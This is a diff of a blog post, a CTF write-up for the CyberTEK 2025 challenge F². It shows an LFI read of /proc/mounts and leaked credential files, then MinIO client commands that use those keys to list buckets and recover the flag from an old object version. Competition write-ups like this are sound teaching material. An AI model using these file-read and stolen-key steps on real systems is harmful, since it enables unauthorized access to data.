@@ -2,25 +2,24 @@
 title: "CyberTEK-CTF 2k25"
 date: 2025-05-05
 draft: false
-description: "Solution for CTCTF 2025"
+description: "How an LFI in a CyberTEK CTF challenge led to an exposed MinIO bucket and a flag hiding in an old object version"
 tags: ["ctf", "misc", "cloud"]
 aliases: ["/writeups/CyberTEK-CTF-2K25/"]
 ---
 
 # Intro
 
-Yesterday, CyberTEK CTF held its second edition at TEK-UP University. The competition, as usual, featured over 40 custom-authored challenges that span different categories, and many participants (+100) praised the high quality of the challenges and the overall experience. However, due to my busy schedule with work and life, I could only author two challenges. The first challenge called Misty (cloud + gw misconfiguration) and the second challenge is F² (authored during the first half of the CTF). As Misty has had zero solves and I plan to keep it for future CTFs, I won't release the writeup for it yet. 
+Yesterday, CyberTEK CTF ran its second edition at TEK-UP University: 40-plus custom-authored challenges, over 100 players, and from what people told me afterward, the lineup landed well. Work and life ate most of my prep time this round, so I only got two challenges in: Misty, a cloud-plus-gateway misconfiguration chain, and F², built during the first half of the CTF itself. Misty still sits at zero solves and I want to reuse it later, so that writeup waits.
 
 ## F² Writeup
 
-In this challenge, we’re given a parameter `f` that is vulnerable to **LFI**.  
-At first glance, reading common files doesn’t reveal anything useful. But there’s a trick... (well, not every LFI gives a flag directly)
+We're handed a parameter `f` vulnerable to **LFI**. Reading the obvious files gets you nowhere at first. But there's a trick: not every LFI hands you a flag directly.
 
-Accessing the `/proc/mounts` file can sometimes give interesting insights into mounted volumes or filesystems:
+`/proc/mounts` is worth checking early — it can surface mounted volumes and filesystems you'd never guess were there otherwise. Here's the request that mattered:
 
-👉 [https://f2.tekup-securinets.org/?f=/proc/mounts](https://f2.tekup-securinets.org/?f=/proc/mounts)
+[https://f2.tekup-securinets.org/?f=/proc/mounts](https://f2.tekup-securinets.org/?f=/proc/mounts)
 
-In the output, we notice some suspicious and uncommon files:
+The output listed a few files that had no business being there:
 
 ```
 travler-gate  
@@ -29,17 +28,17 @@ travler-ep
 inventory-99
 ```
 
-Let’s grab those files using LFI.
+Grab those through the same LFI.
 
-After fetching the `travler-gate`, `travler-key`, and `travler-ep`, we find what look like **access credentials** (possibly for a service).
+Fetching `travler-gate`, `travler-key`, and `travler-ep` turns up what looks like a set of access credentials, though for what, I don't know yet.
 
-Next, try sending a request to the IP used in the challenge:
+Point curl at the challenge IP directly:
 
 ```bash
 curl -v http://185.91.127.50:13131
 ```
 
-And here's the response:
+Response:
 
 ```
 < Server: MinIO
@@ -47,45 +46,44 @@ And here's the response:
 < HTTP/1.1 403 Forbidden
 ```
 
-The `Server: MinIO` header tells us that we’re dealing with a MinIO instance — a self-hosted S3-compatible object storage service.
+The `Server: MinIO` header gives it away: a self-hosted S3-compatible object storage service.
 
-This confirms that the **access and secret keys** we found earlier belong to this MinIO service.
+That confirms the access and secret keys are for MinIO, not some other service on the box.
 
 ## Accessing MinIO
 
-Download the MinIO client `mc` from the official site:  
-👉 [Download Minio here](https://min.io/docs/minio/linux/index.html)
+Grab the MinIO client, `mc`, from the official docs: [min.io/docs/minio/linux](https://min.io/docs/minio/linux/index.html)
 
-Then, configure it with the keys we found:
+Point it at the keys:
 
 ```bash
 mc alias set traveler http://185.91.127.50:13131 ACCESS_KEY SECRET_KEY
 ```
 
-Now, list the available buckets:
+List the buckets:
 
 ```bash
 mc ls traveler
 ```
 
-You should see a bucket named `inventory-99`.
+One bucket shows up: `inventory-99`.
 
-## Step 4: Explore the Bucket
+## Exploring the Bucket
 
-Let’s list the contents:
+Contents:
 
 ```bash
 mc ls traveler/inventory-99
 ```
 
-There’s a file named `item`. Download and inspect it:
+There's one file: `item`. Pull it down and take a look:
 
 ```bash
 mc cp traveler/inventory-99/item .
 cat item
 ```
 
-At first glance, it looks like just a list of inventory items... nothing special.
+At first glance: just a list of inventory items, nothing special.
 
 ```
 - id: 001
@@ -107,15 +105,15 @@ At first glance, it looks like just a list of inventory items... nothing special
   quantity: 1
 ```
 
-But wait, one of the S3 features is versioning, and MinIO supports **versioning** on buckets. That means previous versions of the files might still be accessible.
+Here's the catch: MinIO supports object versioning on buckets, which means older versions of `item` might still be sitting there, untouched.
 
-Let’s list all versions of the `item` file:
+List every version of `item`:
 
 ```bash
 mc ls --versions traveler/inventory-99
 ```
 
-Copy and check the **first version** of the file:
+Pull the first version and check it:
 
 ```bash
 mc cp --vid <version-id> traveler/inventory-99/item flag
@@ -123,10 +121,10 @@ cat flag
 -> securinets{kk12121212121212121212kk}
 ```
 
-for more details check my git repository:
+More detail, plus the full challenge source, lives here:
 
 {{< github repo="chxmxii/CTF" >}}
 
-You can also check the git repo for the other challenges:
+The rest of the CyberTEK 2k25 challenges are in the event repo:
 
 {{< github repo="Securinets-TEKUP/CyberTEK-2.0" >}}
